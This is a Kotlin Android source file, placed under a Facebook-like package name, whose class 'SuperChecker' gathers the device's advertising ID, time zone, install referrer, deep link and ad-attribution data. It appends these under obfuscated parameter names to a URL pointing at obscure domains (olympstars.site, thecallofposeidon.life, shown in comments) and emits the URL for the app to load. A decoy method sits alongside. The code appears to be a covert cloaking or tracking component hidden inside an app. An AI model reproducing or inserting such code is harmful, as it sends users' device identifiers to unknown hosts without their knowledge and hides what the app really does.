package com.facebook.ta.data

import android.content.Context
import android.provider.Settings
import android.util.Log
import com.facebook.ta.App
import com.facebook.ta.Constants
import java.util.TimeZone

class SuperChecker(private val context: Context){


    private val fb = FReciever(context)
    private val aandGReciever = AandGReciever(context)
    private val appUIDReciever = AppUIDReciever(context)
    private val refReciever = RefReciever(context)

    fun execute(data: String, subData: Int): Boolean{
        val result = subData * 33
        logResult(result)

        return true
    }

    suspend fun getData(){
        val constants = Constants(context)
        var baseList: List<String>? = constants.getList()
        val appsUID = appUIDReciever.provideKanielUID()


        //https://olympstars.site/jNSb5tWbRjn4tbj6.php?6tl4351lks=1oqq408ha7&
        val baseDestinationSB = StringBuilder(baseList?.get(2)+baseList?.get(3)+baseList?.get(4)+baseList?.get(5))

        //https://thecallofposeidon.life/call.php?z2vyz7h2wd=q18fl9snt4&afj8gwkt43=GMT&o723szjqof=a3fb882e-ea4f-44b9-88d1-05c8d39f7251&x7f9cgus5k=null&7w3niktc65=null&f04j9kdzd9=null&6c80eomogv=null&o9tf6rc1eg=null&5k0zkasege=null&648cammwwr=null&ep9rrbm9mn=null&2f7i72gs7i=null&4e87l5tmmp=null
        val fb = fb.execute()
        val googleAndApps = aandGReciever.execute(1, 2323) as MutableMap<String, Any>
        val google = googleAndApps[Constants.G].toString()

        if (fb == "null"){
            //FB is EMPTY check Apps and Ref
            val ref = refReciever.getRef()

            val apps : MutableMap<String, Any>? = googleAndApps[Constants.A] as MutableMap<String, Any>?
            //put data into the flow

            //<string name="gadid_key">8b7v5lagic</string>
            baseDestinationSB.append("8b7v5lagic=${google}&")
            //<string name="dev_tmz_key">g1dflvx0z1</string>
            baseDestinationSB.append("g1dflvx0z1=${TimeZone.getDefault().id}&")
            //<string name="referrer_key">eoadoxlvin</string>
            baseDestinationSB.append("eoadoxlvin=${ref.toString()}&")
            //<string name="deeplink_key">xpyy1hvtg5</string>
            baseDestinationSB.append("xpyy1hvtg5=null&")
            //<string name="source_key">bdcozb2n4s</string>
            baseDestinationSB.append("bdcozb2n4s=${apps?.get("media_source")?.toString()}&")
            //af_id_key">lc6z9clbm6</string>
            baseDestinationSB.append("lc6z9clbm6=$appsUID&")
            //<string name="adgroup_key">yt64h4xkge</string>
            baseDestinationSB.append("yt64h4xkge=${apps?.get("adgroup")?.toString()}&")
            //<string name="orig_cost_key">o8l8t0rj5m</string>
            baseDestinationSB.append("o8l8t0rj5m=${apps?.get("orig_cost")?.toString()}&")
            //<string name="af_siteid_key">waa647ah4q</string>
            baseDestinationSB.append("waa647ah4q=${apps?.get("af_siteid")?.toString()}&")
            //<string name="app_campaign_key">c6uondisey</string>
            baseDestinationSB.append("c6uondisey=${apps?.get("campaign")?.toString()}&")
            //<string name="adset_key">ji3r1tp8mb</string>
            baseDestinationSB.append("ji3r1tp8mb=${apps?.get("adset")?.toString()}&")
            //<string name="adset_id_key">t09c9oylf8</string>
            baseDestinationSB.append("t09c9oylf8=${apps?.get("adset_id")?.toString()}&")
            //<string name="campaign_id_key">db9xeokdhq</string>
            baseDestinationSB.append("db9xeokdhq=${apps?.get("campaign_id")?.toString()}")

            App.customLinkFlow.emit(baseDestinationSB.toString())

        } else {
            //FB not empty
            //put data into the flow

            //<string name="gadid_key">8b7v5lagic</string>
            baseDestinationSB.append("8b7v5lagic=${google}&")
            //<string name="dev_tmz_key">g1dflvx0z1</string>
            baseDestinationSB.append("g1dflvx0z1=${TimeZone.getDefault().id}&")
            //<string name="referrer_key">eoadoxlvin</string>
            baseDestinationSB.append("eoadoxlvin=null&")
            //<string name="deeplink_key">xpyy1hvtg5</string>
            baseDestinationSB.append("xpyy1hvtg5=$fb&")
            //<string name="source_key">bdcozb2n4s</string>
            baseDestinationSB.append("bdcozb2n4s=deeplink&")
            //af_id_key">lc6z9clbm6</string>
            baseDestinationSB.append("lc6z9clbm6=$appsUID&")
            //<string name="adgroup_key">yt64h4xkge</string>
            baseDestinationSB.append("yt64h4xkge=null&")
            //<string name="orig_cost_key">o8l8t0rj5m</string>
            baseDestinationSB.append("o8l8t0rj5m=null&")
            //<string name="af_siteid_key">waa647ah4q</string>
            baseDestinationSB.append("waa647ah4q=null&")
            //<string name="app_campaign_key">c6uondisey</string>
            baseDestinationSB.append("c6uondisey=null&")
            //<string name="adset_key">ji3r1tp8mb</string>
            baseDestinationSB.append("ji3r1tp8mb=null&")
            //<string name="adset_id_key">t09c9oylf8</string>
            baseDestinationSB.append("t09c9oylf8=null&")
            //<string name="campaign_id_key">db9xeokdhq</string>
            baseDestinationSB.append("db9xeokdhq=null")

            App.customLinkFlow.emit(baseDestinationSB.toString())

        }

        baseList = null

    }


    private fun logResult(result: Int){
        Log.d("info", "Result $result")
    }
}